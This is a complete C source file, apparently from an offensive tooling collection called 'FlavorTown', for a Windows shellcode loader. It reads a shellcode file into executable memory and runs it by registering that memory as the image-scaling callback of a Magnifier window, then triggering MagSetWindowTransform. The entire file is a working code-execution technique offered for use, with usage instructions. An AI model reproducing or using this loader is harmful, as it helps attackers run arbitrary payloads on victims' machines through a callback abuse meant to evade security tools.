// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Magnification.lib")

#include <stdio.h>
#include <windows.h>
#include <magnification.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: MagSetWindowTransform.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);
	
	MagInitialize();

	HWND hWnd = CreateWindowEx(0, WC_MAGNIFIER, L"MagnifierWindow",
		WS_CHILD || MS_SHOWMAGNIFIEDCURSOR || WS_VISIBLE, 0, 0, 100,
		100, NULL, 0, 0, NULL);

	MagSetImageScalingCallback(hWnd, hAlloc);
	
	MAGTRANSFORM sMT = { 0 };
	MagSetWindowTransform(hWnd, &sMT);

	DestroyWindow(hWnd);

	MagUninitialize();
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}